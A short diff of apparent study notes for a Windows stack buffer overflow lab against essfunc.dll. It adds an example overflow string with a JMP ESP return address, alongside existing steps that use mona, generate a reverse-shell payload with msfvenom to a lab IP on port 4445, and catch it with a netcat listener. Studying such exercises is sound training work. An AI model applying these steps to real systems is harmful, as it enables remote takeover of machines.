@@ -69,7 +69,7 @@ use exploit/multi/handler
         JMP ESP  --> FFE4  
         EXIT
     15. !mona find -s “\xff\xe4” -m essfunc.dll --> 0x625011af  
-    16. set breakpoint with go to disassembler and execute jump.py  
+    16. set breakpoint with go to disassembler and execute jump.py (example shell code shellcode = "C" * 2003 + "\xaf\x11\x50\x62")  
     17. msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.13 LPORT=4445 EXITFUNC=thread -f c -ax86 -b “\x00”
     19. nc -lvnp 4445
     18. copy the generated shellcode and execute shellcode.py
